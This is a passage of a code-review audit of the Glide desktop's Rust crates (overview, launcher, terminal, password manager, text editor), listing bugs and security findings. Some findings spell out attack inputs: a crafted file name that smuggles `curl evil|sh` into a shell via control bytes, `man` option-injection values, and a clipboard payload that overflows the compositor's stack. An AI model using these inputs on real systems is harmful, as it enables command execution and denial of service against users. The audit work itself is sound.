   - **Description**: `render_add` always rasterises at `(ADD_WIDTH, h)` and `place_in` scales the buffer into `drawn`, whose width grows to `thumb.w` (~139 px) as `add_open` goes to 1, so the R2 corners turn elliptical and the 1–2 px side borders become ~2.5× thicker. Rasterise at the drawn width (bucketed) or draw a nine-slice.
3. **The drop highlight on a thumbnail sticks when relayout ends a drag**
   - **Location**: `crates/glide-overlays/src/overview/mod.rs:612-615`
   - **Description**: When the dragged window disappears mid-drag (the app closes it), `relayout` clears `self.drag` and calls `strip.set_dragging(false)` but not `strip.set_drop(None)`, unlike `release` and `cancel_drag`. The thumbnail under the pointer keeps the 1.08 scale, 2 px ring and 18 % tint until the next drag.
4. **After an edge-dwell page switch, dropping on the window's own thumbnail (or nowhere) moves it**
   - **Location**: `crates/glide-overlays/src/overview/mod.rs:954-961, 1004-1006`
   - **Description**: `drop_target` maps the source workspace's thumbnail to `None`, as it does any point outside the grid and edge zones, and `release` turns `None` into `MoveTo::Workspace(self.active)` whenever `source != active`. Drag a window from W1, dwell at the right edge (the page switches to W2), drag back and drop it on W1's thumbnail: it moves to W2, though §9.1 says a window dropped on its own workspace or nowhere glides back. Return a distinct "stay" target for the source slot and fall back to the active page only inside the grid.
5. **The page switch has no slide when the page being left was empty**
   - **Location**: `crates/glide-overlays/src/overview/mod.rs:548-562`
   - **Description**: Leaving an empty active workspace removes it (`Layout::leave_workspace` → `remove_workspace_if_empty`), e.g. a page made with "+" or one whose windows were all dragged away. `set_workspaces` then sees `before.is_some() && after.is_none()` and calls `self.scroll.jump(target)`, after which the retarget check is false, so the pages snap with no t3 tween. Jump to the removed page's neighbouring index, then retarget to `target`.

##### AGENTS.md Trap
1. **Power dialog motion breaks §8**
   - **Location**: `crates/glide-overlays/src/power_dialog.rs:52-53, 143-149, 657-699, 749-762`
   - **Description**: The full-output scene uses `OPEN_SCALE = 0.96` (4 %, under the 8 % / 24 px minimum for scene content) with opacity equal to `openness` instead of `assist`; the confirm pill appears by opacity alone at a fixed position; the question rises only 4 px (under 6) with opacity over the whole t1; the countdown note is pure opacity.
2. **Switcher opacity is not the shorter track, and replacements are fade-only (§8)**
   - **Location**: `crates/glide-overlays/src/switcher.rs:300-303, 570-588`
   - **Description**: `alpha = openness` runs the same E_OUT track as the 0.94 scale, and `replace` (drilling into windows with \`) and `remove_selected` bring new content in through `swap` (opacity 0.35 → 1) with no motion. Use `motion::assist(openness)` and give the swap travel or scale.
3. **The OSD is a pure fade (§8)**
   - **Location**: `crates/glide-overlays/src/osd.rs:137-158`; glue `crates/glide-compositor/src/backend/tty.rs:1623-1640`
   - **Description**: The indicator appears and disappears only through `alpha()` at a fixed `Osd::rect`; nothing moves or scales in the crate or the glue. §8 requires ≥ 6 px or 6 %.
4. **Overview chrome: labels, close button and page cards (§8)**
   - **Location**: `crates/glide-overlays/src/overview/mod.rs:1061, 1427-1460, 1478-1498`
   - **Description**: Tile labels rise `LABEL_RISE = 4` px with linear-`t` opacity instead of `assist(t)`; the per-tile close button appears and disappears instantly as hover moves between tiles; neighbour-page cards appear by opacity alone.
5. **Cache keys omit inputs ("Rasterisation cache keys that omit inputs")**
   - **Location**: `crates/glide-overlays/src/osd.rs:185-188`, `crates/glide-overlays/src/power_dialog.rs:470-484`
   - **Description**: The OSD key (`appearance + accent + reading + level + painter_generation`) has no `theme.revision()`, no `icons.generation()` (its icon comes from `launcher_icons`) and no language (the Caps Lock text), so after an icon-theme change the same reading reuses the raster with the old icon. The power dialog key lacks `icons.generation()`, so a letter fallback baked in at first draw stays after the symbolic icon resolves.

##### Code Health
1. **The overview theme is a snapshot that is never refreshed**
   - **Location**: `crates/glide-overlays/src/overview/mod.rs:244, 380`
   - **Description**: `OverviewUi` clones `OverviewTheme` in `new` with no setter, so an appearance or accent switch (the 19:00 schedule, the Dark Style tile) leaves an open overview in the old colours until reopened. Add `set_theme` and call it from the config apply.
2. **`revert_to_closing` leaves a window drag or thumbnail reorder alive**
   - **Location**: `crates/glide-overlays/src/overview/mod.rs:751-753` (compare `begin_close` at 760-763)
   - **Description**: A gesture that reverts to closing skips `cancel_drag()`, so a held tile drag is drawn into the closing phase and its release can still produce `Release::Move`.
3. **An empty switcher stays open after its last windows close (glue)**
   - **Location**: `crates/glide-compositor/src/state.rs:838-840` with `crates/glide-overlays/src/switcher.rs:367-381, 534`
   - **Description**: `forget_window` calls `switcher.remove(id)` but not `close_switcher_if_empty`; the switcher stays "open" with no entries and swallows keys until the modifier is released, or until Enter / Esc with a modifier-less binding.
4. **`#[allow]` attributes without a justifying comment**
   - **Location**: `crates/glide-overlays/src/switcher.rs:524`, `crates/glide-overlays/src/power_dialog.rs:702`, `crates/glide-overlays/src/overview/mod.rs:1319`
   - **Description**: Two `too_many_arguments` and one `too_many_lines` suppressions lack the justification §5 / §6 require; the argument lists could be bundled as the overview already does with `Frame`.

---

### 29. `glide-launcher` (5,633 lines)

#### Summary
`glide-launcher` is the Spotlight-style launcher, located at `crates/glide-launcher`. `lib.rs` holds the `Launcher` model: the paged grid (5–9 odd columns), category chips, the list and keyboard / pointer selection, the pin / unpin context menu, the scene animation (`scene`, `layers`, `list`, `swap`, `backdrop_openness`, `under_glass`), the overview handoff, `LaunchOrigin`, and all rasterisation and caching. `list.rs` lays out and rasterises the result list; `search.rs` ranks apps, windows, recent files, desktop actions, system commands and Settings panels and builds Run-mode entries; `calc.rs` is a recursive-descent arithmetic evaluator; `recent.rs` parses `recently-used.xbel`; `history.rs` keeps launch frecency (`launches.json`) and the 0600 run history; `providers.rs` is the `org.gnome.Shell.SearchProvider2` worker with a 600 ms deadline.

The crate has no `unsafe`; the only comment justifies an `#[allow]` at `search.rs:564`, while two other `#[allow]`s lack one (Code Health 5). `cargo clippy -p glide-launcher --all-targets -- -D warnings` is clean and all 93 unit tests pass. Deep review found 1 Critical, 6 Bugs, 2 AGENTS.md trap violations and 5 Code Health issues.

#### Findings

##### Critical
1. **Pasting a long run of `(` into the launcher overflows the main thread's stack and kills the compositor**
   - **Location**: `crates/glide-launcher/src/calc.rs:74-148, 165-172`, `crates/glide-launcher/src/search.rs:614`; `crates/glide-compositor/src/launcher_glue.rs:14, 255-272`; `crates/glide-shell/src/field.rs:61-72`
   - **Description**: The parser recurses without a depth limit: each `(` costs about five frames (`primary` → `expression` → `term` → `unary` → `postfix` → `primary`) and each leading sign one (`unary` calls itself). `Launcher::insert_text` → `refilter` → `build_entries` → `calc::calculation(query)` runs on the compositor's event-loop thread on every edit; Ctrl+V reads up to `PASTE_LIMIT` = 64 KiB from any client's selection, `TextField::insert_str` keeps `(`, and nothing caps the query length or token count. A web page (or any client) that puts 64 K `(` on the clipboard and a user who pastes into the launcher make the evaluator nest ~330 K frames, far past the 8 MB main stack; the process aborts with "has overflowed its stack" and the whole session goes down with every client's unsaved work. Repeated smaller pastes, or a long run of `-` in debug builds, do the same. Add a depth counter to `Parser` (fail past ~64 levels) and cap the query length.

##### Bug
1. **Search-provider D-Bus calls have no timeout: hung providers leak a thread per query, and one `ActivateResult` can stop the worker for good**
   - **Location**: `crates/glide-launcher/src/providers.rs:32-64, 94-115, 117-154`
   - **Description**: `zbus::blocking::Connection::session()` uses zbus's default `method_timeout: None`. `run_query` spawns one thread per provider per query; when a provider accepts the call and never replies, `recv_timeout` gives up after 600 ms but the thread stays blocked in `call_method` until that provider dies, so every query leaks one thread per hung provider (about one per 600 ms of typing). `Job::Activate` calls `ActivateResult` synchronously on the single worker; if the provider never answers, the "From Apps" section is dead for the rest of the session. Set a method timeout on the connection and send `ActivateResult` without waiting.
2. **Asynchronous results reset the keyboard selection, so Enter can launch a different entry**
   - **Location**: `crates/glide-launcher/src/lib.rs:912-934, 1079-1116` (reset at `1106-1109`)
   - **Description**: `set_provided` (provider answers, up to 600 ms after the last key), `set_recent` and `set_apps` call the full `refilter()`, which sets `selected = Some(0)`, `list_scroll = 0` and `pointer_selected = false`. Type "term", press Down twice to reach an action or window row; when providers answer ~400 ms later the highlight jumps back to row 0 and an Enter pressed just after launches the first entry. Keep the selection by entry identity when sources change.
3. **Typing while the grid's context menu is open leaves the menu active, and it then acts on whatever app fills that slot**
   - **Location**: `crates/glide-launcher/src/lib.rs:733-781, 844-846, 1079-1116`; callers `crates/glide-compositor/src/input.rs:497-507, 2015, 2732-2734`, `crates/glide-compositor/src/state.rs:2717-2736`
   - **Description**: The menu stores a result index (`LauncherMenu::result`). Printable keys still reach `LauncherType` while it is open, and `push_query` → `refilter` replaces `results` without closing `self.menu`, which stays drawn. Right-click Firefox (result 7), type "c", click "Pin to Dock": result 7 of the "c" results (or nothing) is pinned and written to `pins.toml`. Close the menu when results change, or store the app index.
4. **`%` followed by a sign is read as modulo, giving wrong answers**
   - **Location**: `crates/glide-launcher/src/calc.rs:85-109, 125-133`
   - **Description**: `percent_is_modulo` returns true when the next token is `Minus` or `Plus`, so `100*50%-10` evaluates as `5000 % -10` = **0** (expected 40), `50%+1` as `50 % 1` = **0** (expected 1.5) and `100+50%-20` as **110**. These values are shown in the Calculator row and copied by Enter. Treat `%` before `+` / `-` as a postfix percentage.
5. **Recent files whose names contain an apostrophe are silently dropped**
   - **Location**: `crates/glide-launcher/src/recent.rs:20-22, 27-37`
   - **Description**: GLib writes `href` through `g_markup_escape_text`, turning `'` (left unescaped by URI escaping) into `&#39;`, and `unescape_xml` only knows the five named entities. `file:///home/u/Tom's notes.pdf` is parsed as `Tom&#39;s notes.pdf`, fails `Path::exists`, and never appears in Recent Files. Decode numeric character references.
6. **A provider answer for a closed launcher can be shown in the next one**
   - **Location**: `crates/glide-launcher/src/lib.rs:573-574, 928-956`; `crates/glide-compositor/src/launcher_glue.rs:60-84`, `crates/glide-compositor/src/state.rs:2302-2310`
   - **Description**: `provider_generation` belongs to each `Launcher` and restarts at 0, while the provider thread and its channel are shared by the session. Launcher A types "ab" (generation 1) and closes; launcher B types one character (generation 1, below `MIN_QUERY`, nothing sent); A's answer arrives inside its 600 ms window, passes `generation == self.provider_generation`, and B lists "From Apps" results for "ab". Use a process-global counter or echo the query terms back.

##### AGENTS.md Trap
1. **The menu hover-layer cache survives a theme change, and chip buffers omit their label ("Rasterisation cache keys that omit inputs")**
   - **Location**: `crates/glide-launcher/src/lib.rs:608, 1239-1267, 1885-1896`
   - **Description**: `menu_row_layer` is keyed on `output_scale` alone and filled with `theme.menu.item_hover`; neither `invalidate_stale_buffers` (which clears every other cache on a `raster_revision` change) nor `open_menu` clears it, so after a light ↔ dark switch with the launcher open (e.g. the 19:00 schedule) the hover row keeps the old colour. Chip buffers are keyed `(slot, step, scale)` without the label, so a live language change keeps the old chip text.
2. **The context menu's opacity runs the whole length of its motion (§8)**
   - **Location**: `crates/glide-launcher/src/lib.rs:1849-1852`
   - **Description**: `menu_alpha = progress.clamp(0.0, 1.0) * frame.alpha` uses the eased motion progress directly, reaching 1 only at the end of entry and dropping from the first frame of exit. Every other layer in the crate goes through `motion::assist`; this one should too.

##### Code Health
1. **One unreachable recent file stalls the whole launcher**
   - **Location**: `crates/glide-launcher/src/recent.rs:51-78`; `crates/glide-compositor/src/state.rs:2323-2331`
   - **Description**: `recent_files` `stat`s every bookmark on the loader thread, which sends apps, icons, history and recent files as one message, so a recent file on a hung NFS / sshfs mount makes the launcher open with no apps at all. Load recent files separately or bound the check.
2. **The frequency bonus can reorder keyword tiers**
   - **Location**: `crates/glide-launcher/src/search.rs:16-22, 91-98, 731-740`
   - **Description**: `FREQUENCY_BONUS_MAX` (150) exceeds the gap between keyword prefix (400) and keyword substring (300), so a frequently launched app whose keyword merely contains the query outranks one whose keyword starts with it, contrary to the test name `frequency_reorders_within_a_tier_but_never_across_tiers` (which checks only name tiers).
3. **History writes can lose updates**
   - **Location**: `crates/glide-launcher/src/history.rs:84-93, 122-138`
   - **Description**: `save_in_background` spawns one unordered thread per launch, each writing a full snapshot, so an older snapshot can land last; `remember_run` does an unsynchronised read-modify-write; `std::thread::spawn` panics on the event loop if a thread cannot be created. Serialise writes through one writer.
4. **Event-loop work that grows with input or touches the disk**
   - **Location**: `crates/glide-launcher/src/lib.rs:813-819, 2139-2150`
   - **Description**: `begin_run_mode` reads `run-history` synchronously on the key press, and `push_search_field` reshapes `caret_prefix` with `text_width_styled` every frame without caching; with no length cap a 64 KiB paste makes every caret-blink frame shape the whole string.
5. **Two `#[allow]`s lack justification comments**
   - **Location**: `crates/glide-launcher/src/lib.rs:1590, 1703`
   - **Description**: `#[allow(clippy::unused_self)]` and `#[allow(clippy::too_many_arguments, clippy::too_many_lines)]` have no justification as §5 / §6 require; `search_contains` could simply drop `&self`.

---

### 30. `glide-terminal` (6,607 lines)

#### Summary
`glide-terminal` is Glide's terminal emulator, located at `crates/glide-terminal`: `alacritty_terminal` 0.26 does the emulation with one event loop per pane, pane events are batched into an iced subscription (`session.rs`), and the UI is built on glide-sdk with `Chrome::Own`. `app.rs` holds tabs and splits, shortcuts, paste, the find driver and close confirmation; `terminal.rs` the pane widget, mouse reporting and links; `input.rs` key and mouse encoding; `session.rs` pty spawn plus foreground process, cwd and root / SSH context from `/proc`; `find.rs` worker-thread counting; and `hints.rs`, `marks.rs`, `export.rs` (portal SaveFile with an exclusive-create fallback), `dnd.rs` (its own wayland-client connection), `service.rs` (`org.glide.Terminal1.OpenTab`, the tab search provider, the quicklist), `config.rs` (`terminal.toml` via `toml_edit` and `write_atomic`), `sound.rs`, `profile.rs`, `chrome.rs`.

The only `unsafe` is two blocks in `dnd.rs:129, 132` (`Backend::from_foreign_display`, `ObjectId::from_ptr`), each with a `// SAFETY:` comment; the other comments justify `#[allow]`s, so the crate complies with `AGENTS.md` § 6. `cargo clippy -p glide-terminal --all-targets -- -D warnings` is clean and all 74 tests pass. Checked and fine: pty fds are CLOEXEC; every child is waited by its owner (no `waitpid(-1)`); `\e[201~` injection is blocked (ESC stripped inside bracketed paste); OSC 8 / URL opening uses a scheme allowlist refusing a leading `-`, executables and `.desktop` files; mark hyperlinks are excluded from link opening; find results carry generation, pane and revision guards; zero-size panes are clamped. Deep review found 1 Critical, 3 Bugs, 1 AGENTS.md trap violation and 3 Code Health issues.

#### Findings

##### Critical
1. **Pasted and dropped text passes raw C0 control bytes to the pty, so bracketed paste and file-name quoting can be escaped into command execution**
   - **Location**: `crates/glide-terminal/src/app.rs:1465-1475, 1499-1526` (`paste_bytes`), `crates/glide-terminal/src/dnd.rs:58-84` (`quote` / `quote_bytes`)
   - **Description**: In bracketed mode `paste_bytes` removes only `0x1b`; every other control byte (`0x03`, `0x1a`, `0x1c`, `0x15`, `0x04`, …) reaches the pty, and in non-bracketed mode nothing is removed except the `\n` → `\r` rewrite. Shells keep `ISIG` while editing a line, so a `0x03` written to the master makes the line discipline send SIGINT, which aborts the half-read bracketed paste; the remaining bytes are then read as typed input. A file named `x\x03 curl evil|sh\ry` (legal on Linux) dragged from Files onto a pane is quoted as `'x\x03 curl evil|sh\ry' `: bash sees `'x`, ^C cancels the line, and ` curl evil|sh` followed by `\r` runs. The same works through Ctrl+Shift+V with a clipboard payload from a web page, or from any program output, since OSC 52 copy is on by default (`Osc52::OnlyCopy`), so `cat`-ing a hostile file arms the clipboard. Quote file names with `$'…'` and `\xNN` escapes for control bytes, and strip C0 / C1 controls other than `\t`, `\r`, `\n` from pastes, as VTE and kitty do.

##### Bug
1. **"Open man Page" passes a selected word starting with `-` to `man` as an option**
   - **Location**: `crates/glide-terminal/src/app.rs:591-596` (`man_topic`), `1632-1641` (`Command::ManPage`)
   - **Description**: `man_topic` accepts any 1–64 character run of alphanumerics and `-_.:+`, including leading dashes, and it becomes `argv[1]` of `man` with no `--`. Selecting `-Pfoo` or `-C.evil` in terminal output and choosing "Open man Page" makes man-db run `foo` as the pager or load `.evil` from the shell's cwd as its configuration (whose `DEFINE`s name the commands it runs); `-Hbrowser` launches a browser. Argument injection from untrusted screen text. Reject a leading `-` or pass `--`.
2. **A single `-e` / `--` argument with whitespace is re-run through `sh -c`, breaking program paths with spaces**
   - **Location**: `crates/glide-terminal/src/app.rs:309-317` (`parse_args`)
   - **Description**: When exactly one argument with whitespace follows `-e` or `--`, it becomes `sh -c <arg>`. Glide wraps `Terminal=true` desktop entries as `glide-terminal -e <Exec>`, so an entry whose Exec is a lone quoted `"/opt/My App/run"` runs `/opt/My`. `--` is conventionally exact argv (gnome-terminal, ptyxis, xdg-terminal-exec) but gets the same shell re-parse, so a name containing `;` or `$(...)` is executed by the shell. Apply the `sh -c` compatibility only to `-e` / `-x`, and not when the argument is an existing path.
3. **Focusing a tab from the launcher search leaves its bell / activity mark set**
   - **Location**: `crates/glide-terminal/src/app.rs:998-1004` (`Request::FocusTab`)
   - **Description**: `FocusTab` sets `self.active = index` directly instead of calling `select()`, which clears `bell` and `activity`; a background tab that rang keeps its mark after being activated from the launcher until it is clicked again. Call `self.select(index)`.

##### AGENTS.md Trap
1. **Notice and error toasts appear or vanish without motion (§8)**
   - **Location**: `crates/glide-terminal/src/app.rs:861`, `crates/glide-terminal/src/chrome.rs:456-461`
   - **Description**: The export notice enters through `toast_pill(App::reveal(at))` but after `NOTICE` (4 s) is dropped on the next `Tick` and disappears in one frame with no exit track; the spawn-error toast is always drawn at `progress = 1.0`, so it pops in and out; even the entry rise is `POPOVER_RISE` = 6 px where §8 asks ≥ 24 px or 8 % for notices. Give both toasts a reversible `Reveal` with an exit and a ≥ 24 px rise.

##### Code Health
1. **Ctrl+_ (readline / emacs undo) is taken as "zoom out"**
   - **Location**: `crates/glide-terminal/src/app.rs:370-371`
   - **Description**: `(true, _, false, '-' | '_')` ignores Shift and `key` is the unmodified `-`, so Ctrl+Shift+- (`C-_`) never reaches the shell. Ctrl+/ still sends `0x1f`, but the documented `C-_` binding is lost. Bind zoom-out to Ctrl+- without Shift only.
2. **Find and export are invalidated by any output, and UI-side grid edits do not bump the revision**
   - **Location**: `crates/glide-terminal/src/session.rs:34-39`, `crates/glide-terminal/src/find.rs:55-58`, `crates/glide-terminal/src/export.rs:69-95`, `crates/glide-terminal/src/app.rs:863-868, 1728-1747`
   - **Description**: `revision` bumps on every `Wakeup`, so a pane that prints steadily (`top`, `tail -f`, a build) aborts every count and the counter can stay at "…" indefinitely; export of such a pane fails after three tries. Clear to Start, Reset and the exit note mutate the grid on the UI thread without bumping it, so an in-flight count can select a match that no longer exists (clamped, no crash).
3. **A portal error after the user chose a destination silently saves into the home folder instead**
   - **Location**: `crates/glide-terminal/src/export.rs:160-173`
   - **Description**: Any `zbus::Error` from `choose()`, including "non-local destination" or a reply body that fails to deserialize after the dialog was answered, takes the fallback that writes `~/Terminal Saved Output.txt`; the user is told it was saved, but not where they asked. Fall back only when the portal itself is unavailable.

---

### 31. `glide-passwords` (6,705 lines)

#### Summary
`glide-passwords` is the password manager app (iced via glide-sdk, `Chrome::Own`), located at `crates/glide-passwords`, a thin UI client of the `glide-keychain` daemon. `client.rs` makes async zbus `Call`s with JSON requests and follows the `Changed` stream; `app.rs` holds the message loop, selection, copy and clipboard clearing, the TOTP tick and the key map; `model.rs` sections, search, sorting and problem counts; `view.rs` the header, sidebar, list, detail card, menus and dialog frame; `editor.rs` the draft (sending only changed secrets) and QR scan; `scan.rs` otpauth parsing; `generator.rs` passwords, BIP-39 phrases and PINs (rejection-sampled `getrandom`, whole-candidate rejection for guaranteed classes — unbiased); plus `sends.rs`, `transfer.rs`, `security.rs`, `settings.rs`, `wizard.rs`, `conflict.rs`, `i18n.rs`, `icons.rs`.

The crate has no `unsafe`; its only comments are six `#[allow]` justifications, so it complies with `AGENTS.md` § 6. `cargo clippy -p glide-passwords --all-targets -- -D warnings` is clean and all 26 unit tests pass (no integration tests). The generator's rejection maths, BIP-39 indexing, otpauth base32 / percent-decoding and Send lifetime arithmetic were checked and look correct. Deep review found 10 Bugs, 1 AGENTS.md trap violation and 5 Code Health issues.

#### Findings

##### Critical
None identified.

##### Bug
1. **Typing a TOTP key by hand scrambles it after the fourth character**
   - **Location**: `crates/glide-passwords/src/editor.rs:330-336, 446-447`
   - **Description**: The field shows `grouped_key(&editor.totp)` (a space every four characters) and `on_input` strips whitespace before storing. iced 0.14's `text_input` keeps its cursor as a plain index into the displayed string and does not remap it when the value comes back reformatted. After `ABCD` + `E` the cursor is at index 5 of `ABCDE`, but the field now shows `ABCD E`, where index 5 is *before* the `E`; the next `F` lands there. Typing `ABCDEFGH` stores `ABCDFGHE` (masked mode too), so a wrong TOTP secret is saved silently and every code fails; only pasting a whole key works. Bind the input to the raw string and group only for display.
2. **The app's startup copy of the preferences overwrites `passwords.toml` written by Settings**
   - **Location**: `crates/glide-passwords/src/app.rs:245, 533-536`, `crates/glide-passwords/src/settings.rs:53-62, 119-120`
   - **Description**: The consumer side of `glide-config` Bug 2: `Prefs::load()` runs once in `App::new`, and every sort toggle or settings event saves the whole struct. With Passwords open, turning off "Lock with screen" in Settings is silently reverted by the next sort toggle; `lock_after`, `private_clipboard`, `clear_after` and `offer` can be reverted the same way, and the app's own copies keep using the old `clear_after`. Reload, change one key and save, or watch the file.
3. **Hidden custom fields with the same name lose their values on edit and copy the wrong value**
   - **Location**: `crates/glide-passwords/src/app.rs:457-460, 612-624`, `crates/glide-passwords/src/editor.rs:119-124, 171-179`
   - **Description**: Hidden fields are fetched by name (`SecretKind::Field(field.name)`) and the daemon returns the first field with that name (`glide-keychain/src/daemon.rs:570-575`); `from_detail` also matches by name. With duplicate names (two "Security answer" fields, or two empty names — common in Bitwarden items and imports) both editor rows get the first value, saving sends `[(name, v1), (name, v1)]` and permanently overwrites the second secret, and `Copy(Field(1))` copies the first. Address hidden fields by index or stable id.
4. **The TOTP countdown counts local ticks, so after suspend it shows, and copies, an expired code**
   - **Location**: `crates/glide-passwords/src/app.rs:601-607, 656-669`, `crates/glide-passwords/src/view.rs:493-505`
   - **Description**: `seconds_left` is decremented once per `iced::time::every(1s)` tick (a monotonic clock that does not advance during suspend) and re-fetched only when it reaches 1. After a 10-minute suspend the card shows the old code with e.g. 20 s "left", and `Copy(Code)` copies it without re-fetching, so the server rejects it. Store the wall-clock expiry and re-fetch once passed (and before copying).
5. **Dates and "today / yesterday" are computed in UTC, not local time**
   - **Location**: `crates/glide-passwords/src/i18n.rs:400-421, 443-449`, `crates/glide-passwords/src/transfer.rs:90-93`
   - **Description**: `date()` uses `unix / 86_400` and `civil(unix)` without an offset; only `moment_at` applies `utc_offset`. In Kyiv (UTC+3) an item changed at 01:00 local on 12 Oct reads "вчора" and 11 Oct; `stamp()` combines a UTC date with a local time ("вчора 01:00" for something done today), used by the conflict sheet; the export file name uses the UTC date. The test `dates_are_short_and_local` only uses offset 0.
6. **No clipboard fallback when `CopySecret` fails, contrary to the documented behaviour**
   - **Location**: `crates/glide-passwords/src/app.rs:425-431, 634-641`
   - **Description**: AGENTS.md §9.1 says copies fall back to the iced clipboard "with the same clearing when the shell refuses", but on `placed == false` the code drops `copied` and toasts `CopyRefused`. Whenever `org.glide.Shell` is absent (app started outside Glide, bus down) nothing secret can be copied, and the toast wrongly blames focus. Fall back on a bus error (as distinct from `AccessDenied`), or fix the doc and message.
7. **"Remove vault" deletes a Bitwarden account and its unsynced offline queue with one click**
   - **Location**: `crates/glide-passwords/src/settings.rs:69, 149-162`
   - **Description**: The menu item sends `RemoveVault` at once; for Bitwarden `forget()` deletes the account file (`glide-keychain/src/bitwarden/mod.rs:954-960`), which also holds the persisted offline queue the row advertises as "N змін у черзі". A misclick on an offline vault loses edits that never reached the server. Purge has a confirmation; this needs one too.
8. **"Delete forever" purges whatever is selected at confirmation, not the item named in the dialog**
   - **Location**: `crates/glide-passwords/src/app.rs:738-756`
   - **Description**: `AskPurge` builds the title from `detail.summary.name`, but `Message::Purge` carries no item and uses `self.selected` when confirmed. A `Changed` signal while the dialog is open (sync, another client) runs `reload` → `keep_selection`, and if the item left the Trash list the selection moves to the first visible item; confirming irreversibly purges a different item. Make it `Message::Purge(ItemRef)`.
9. **One process-global "show secrets" flag reveals passwords in later, unrelated dialogs**
   - **Location**: `crates/glide-passwords/src/view.rs:773-787`, `crates/glide-passwords/src/app.rs:684-687`
   - **Description**: Every `view::secret_input` shares `static SECRETS_SHOWN`, which is never reset: export password and repeat, import / KeePass password, change-vault-password (old, new, repeat), local-vault creation, KeePass master password, API `client_secret`, Send password. Pressing the eye once in the export dialog leaves every later prompt in the process showing passwords in clear text. Keep reveal state per form and reset it when a form opens.
10. **Send creation goes to a stale vault while the dropdown shows another, and a `Locked` reply is swallowed**
    - **Location**: `crates/glide-passwords/src/sends.rs:89-92, 234-263, 475-482`
    - **Description**: The dropdown shows `servers.find(form.vault).or_else(first)` over unlocked Bitwarden vaults, while `request()` uses `form.vault` whenever it is non-empty, and `form.vault` survives `New` / `Done`. With two accounts, pick A, lock A later: the form shows B but Create sends to A, the daemon answers `Response::Locked`, and `Created`'s `Ok(_) => {}` drops it with no toast. Resolve the vault exactly as the dropdown does and route other replies through `app.after`.

##### AGENTS.md Trap
1. **Dialogs vanish with no exit motion, and their entry is only a 4 % scale (§8)**
   - **Location**: `crates/glide-passwords/src/view.rs:694-708, 762-771`, `crates/glide-passwords/src/app.rs:278-282, 944-948`
   - **Description**: `App::modal` is a `Fade::asymmetric(EXPAND, FADE)` meant to animate open and close, but every close path clears the state first (`settings = false`, `wizard = None`, `create = None`, `transfer = None`, `conflict_open = false`), so `view()` stops pushing the sheet and scrim and card disappear in one frame while `Message::Frame` keeps redrawing for the leave duration. The entry is `overlay::modal` scaling 0.96 → 1 with no travel, below §8's thresholds (shared with `glide-sdk::overlay::modal` / `component::DIALOG_CLOSED_SCALE`). Keep the last sheet alive until `modal_progress()` reaches 0.

##### Code Health
1. **Selection is re-fetched on every keystroke and every `Changed` signal**
   - **Location**: `crates/glide-passwords/src/app.rs:367-404, 525-532`
   - **Description**: `keep_selection` always calls `select()`, so each search keystroke and each sync sends two D-Bus requests (`Item`, `Totp`), hides a revealed password and blanks the TOTP row until the reply arrives. Refresh only when the item or its `modified` stamp changed.
2. **Secrets live in plain, `Debug`-derived Strings and survive locking**
   - **Location**: `crates/glide-passwords/src/app.rs:118-123, 151-168, 406-410`, `crates/glide-passwords/src/transfer.rs:34-40`, `crates/glide-passwords/src/settings.rs:38-44`, `crates/glide-passwords/src/wizard.rs:53-75, 394-400`, `crates/glide-passwords/src/editor.rs:15-38`
   - **Description**: `Generating`, `Transfer`, `PasswordChange`, `Wizard` and `Create` derive `Debug` over plain `String` passwords; editor secrets are non-zeroized; `copied` keeps the last secret; on lock (Ctrl+L or screen lock) the editor, `revealed` and the `generated` history are not cleared and reappear after unlocking.
3. **Blocking work runs inside async tasks**
   - **Location**: `crates/glide-passwords/src/app.rs:427-430`, `crates/glide-passwords/src/transfer.rs:101-103, 166-171`
   - **Description**: `glide_sdk::system::copy_secret` is a blocking zbus call, and `std::fs::read` (up to 32 MiB) and `write_private` run directly inside `Task::perform` futures, blocking a tokio worker. `scan.rs` already uses a helper thread and a oneshot.
4. **The "change password" flags leak into a later selection**
   - **Location**: `crates/glide-passwords/src/app.rs:542-551, 799-808`
   - **Description**: `edit_when_loaded` / `generate_on_edit` are cleared only when a matching `Detail` arrives; if item A's detail fails or the user selects B first, B's `Detail` opens the editor with the generator on B. Store the target `ItemRef` or clear in `Select`.
5. **The change-vault-password form is dropped before the result is known**
   - **Location**: `crates/glide-passwords/src/settings.rs:92-108`
   - **Description**: `SubmitPassword` `take()`s the form before the daemon replies, so a wrong old password loses all three typed passwords, and success gives no confirmation.

---

### 32. `glide-text` (8,188 lines)

#### Summary
`glide-text` is the Glide notepad, located at `crates/glide-text`: `document.rs` (decode / encode, atomic save, the `Document` model mirroring iced `Content`), `history.rs` (diff-based undo with word merging and a 64 MiB budget), `find.rs`, `edit.rs` (line ops, comments, indent, auto-pair, list continuation), `syntax.rs` (tree-sitter → per-line spans, the iced `Highlighter` bridge, a worker above 96 KiB), `detect.rs`, `tree.rs`, `finder.rs`, `table.rs`, `config.rs` (`text.toml`, `session.toml`, drafts), `chrome.rs` (views, menus, exported dbusmenu) and `app.rs` (update loop, save queue, session restore).

The crate has no `unsafe`; its only comments are four `#[allow]` justifications, so it complies with `AGENTS.md` § 6. `cargo clippy -p glide-text --all-targets -- -D warnings` is clean and all 90 tests pass. Deep review found 1 Critical, 7 Bugs, 1 AGENTS.md trap violation and 5 Code Health issues.

#### Findings

##### Critical
1. **Quitting never asks while session restore is on, but failed session or draft writes are ignored, so unsaved work can be lost silently**
   - **Location**: `crates/glide-text/src/app.rs:540-570, 2353-2356, 2386-2391, 2425-2479`, `crates/glide-text/src/config.rs:153-158`
   - **Description**: When this instance is primary and `restore_session` is on (the default), `request_window_close` goes straight to `finish(After::Window)`, which writes drafts and `session.toml` on a thread and exits; `write_session` only `eprintln!`s errors and nothing checks that the session landed. `Session` holds `PathBuf`s (`folder`, `tabs[].path`, `recent`), and serde's `Path` serializer fails on non-UTF-8 paths, so after opening one file named e.g. `caf\xe9.txt` (which also stays in `recent` after its tab closes) every `toml::to_string(session)` fails. Before failing, `write_session` has already written new drafts and deleted every draft not in `writes`; the stale `session.toml` does not reference drafts of tabs created since its last good write, so on the next launch those tabs are missing and the first `write_session` deletes their orphaned drafts, while path-backed tabs without a draft in the stale session reopen from disk without their edits. A full disk or read-only state directory does the same. Fall back to the Unsaved dialog when any draft or session write fails, and store paths byte-safely.

##### Bug
1. **Keystrokes typed while a save is in flight are marked saved but never reach the disk**
   - **Location**: `crates/glide-text/src/app.rs:2272-2307`, `crates/glide-text/src/history.rs:111-116`, `crates/glide-text/src/document.rs:444-454`
